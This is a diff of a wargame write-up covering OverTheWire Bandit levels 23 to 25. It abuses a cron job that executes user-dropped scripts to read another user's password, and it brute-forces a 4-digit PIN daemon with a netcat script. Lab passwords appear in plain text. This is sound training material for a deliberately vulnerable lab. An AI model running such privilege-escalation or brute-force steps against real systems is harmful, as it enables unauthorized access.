@@ -793,25 +793,26 @@ done
 ```
 
 Let's break down what the above bash script does:
-1. The `myname` variable is assigned the output of the command `whoami` typed by the user `bandin24`. 
 
-  ```bash
-  bandit23@bandit:~$ whoami
-  bandit23
-  ```
+The `myname` variable is assigned the output of the command `whoami` typed by the user `bandin24`. 
 
-2. Then it iterates through all files within the `/var/spool/bandit24/foo` directory, ignores the current (`.`) and previous (`..`) directories, and then checks who is the owner of the file.  
+```bash
+bandit23@bandit:~$ whoami
+bandit23
+```
 
-  ```bash
-  bandit23@bandit:/tmp$ stat --format "%U" test.txt
-  bandit23
-  ```
+Then iterates through all files within the `/var/spool/bandit24/foo` directory, ignores the current (`.`) and previous (`..`) directories, and then checks who is the owner of the file.  
+
+```bash
+bandit23@bandit:/tmp$ stat --format "%U" test.txt
+bandit23
+```
 
   > [`stat` command in Linux](https://linuxize.com/post/stat-command-in-linux/).
 
-3. If the owner is the user `bandint23`, it executes the script. If the scripts runs for more than 60 seconds, then it will be forcefully terminated. Finally, it deletes the script.
+Finally, if the owner is the user `bandint23`, it executes the script. If the scripts runs for more than 60 seconds, then it will be forcefully terminated. Finally, it deletes the script.
 
-We have to create a script that reads `bandit24`'s password, move it to the `/var/spool/bandit24/foo/` directory, and wait for it to execute. According to the output of `/etc/cron.d/cronjob_bandit24`, it executes every minute, so it should be executed within maximum of 1 minute.
+As a result, we have to create a script that reads `bandit24`'s password, move it to the `/var/spool/bandit24/foo/` directory, and wait for it to execute. According to the output of `/etc/cron.d/cronjob_bandit24`, it executes every minute, so it should be executed within maximum of 1 minute.
 
 ```bash
 # create a new director within /tmp
@@ -862,11 +863,13 @@ VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
 Wrong! Please enter the correct pincode. Try again.
 ```
 
-Now we can create a brute-forcing script to get all the possible combinations. We can loop through all possible 4-digit combinations (`for i in {0000..9999}`), add each pin to the flag separated by a space (`echo "$password $i"`), and then append each sequence to a file (`>> pin_combinations.txt`). Passing the file as it is, i.e., with 10000 combinations, makes the connection to timeout, so we have to split it into 2 separate ones (`split -l 5000 pin_combinations.txt pin_`). We can then pass each file to the daemon listening (`nc localhost 30002 < pin_aa > results_A` & `nc localhost 30002 < pin_ab >> results_A`), and search for a unique row in the final output (`sort results_A | uniq -u`):
+Now we can create a brute-forcing script to get all the possible combinations. We can loop through all possible 4-digit combinations (`for i in {0000..9999}`), add each pin to the flag separated by a space (`echo "$password $i"`), and then append each sequence to a file (`>> pin_combinations.txt`). 
+
+Passing the file as it is, i.e., with the 10000 resulting combinations, makes the connection to timeout, so we have to split it into 2 separate files (`split -l 5000 pin_combinations.txt pin_`). We can then pass each file to the daemon listening (`nc localhost 30002 < pin_aa > results_A` & `nc localhost 30002 < pin_ab >> results_A`), and search for a unique row in the final output (`sort results_A | uniq -u`):
 
 ```bash
 bandit24@bandit:/tmp/lvl_24$ nano bruteForce.sh
-bandit24@bandit:/tmp/lvl_24$ cat bruteForce.sh
+bandit24@bandit:/tmp/lvl_23$ cat bruteForce.sh
 #!/bin/bash
 
 # set a variable with the previous level flag
@@ -881,40 +884,50 @@ do
         # append the password plus the pin combination separated by a space to a file
         echo "$password $i" >> pin_combinations.txt
 done
+echo "Done."
 
 echo "Splitting the file into two..."
 # split the file into 2 separate files
 split -l 5000 pin_combinations.txt pin_
+echo "Done."
 
 echo "Brute-force starting...passing the first file..."
 # pass the first file and write the results
 nc localhost 30002 < pin_aa > results_A
+echo "Done."
 
 echo "Brute-force continues...passing the second file..."
 # pass the second file and write the results
 nc localhost 30002 < pin_ab >> results_A
+echo "Done."
 
 echo "Searching for the flag..."
 # search for the flag
 sort results_A | uniq -u
+echo "Flag found!"
 ```
 
 Now all we have to do, is execute our script:
 
 ```bash
 # execute the script
-bandit24@bandit:/tmp/lvl_24$ ./bruteForce.sh
+bandit24@bandit:/tmp/lvl_23$ ./bruteForce.sh
 The password is: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar.
 Creating the pin combination file...
+Done.
 Splitting the file into two...
+Done.
 Brute-force starting...passing the first file...
+Done.
 Brute-force continues...passing the second file...
+Done.
 Searching for the flag...
 
 Correct!
 Exiting.
 The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
 Timeout. Exiting.
+Flag found!
 ```
 
 ## [Level 25 &rarr; 26](https://overthewire.org/wargames/bandit/bandit26.html)
